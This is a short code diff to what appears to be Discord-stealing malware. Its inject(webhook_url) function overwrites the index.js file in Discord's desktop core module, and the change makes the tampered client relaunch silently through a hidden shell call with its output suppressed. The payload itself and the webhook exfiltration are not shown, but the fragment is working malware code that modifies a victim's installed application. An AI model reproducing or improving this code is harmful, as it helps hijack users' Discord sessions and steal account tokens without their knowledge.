@@ -6,6 +6,7 @@ import platform
 import re
 import shutil
 import sqlite3
+import subprocess
 import uuid
 from base64 import b64decode
 from json import loads
@@ -461,7 +462,7 @@ def inject(webhook_url):
 					modules_dir = os.listdir(abspath+'\\modules') 
 					with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
 						indexFile.write(f)
-					os.startfile(abspath+os.sep+_dir+'.exe')
+					subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	
 	if os.path.exists(appdata+'\\discord'):
 		with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
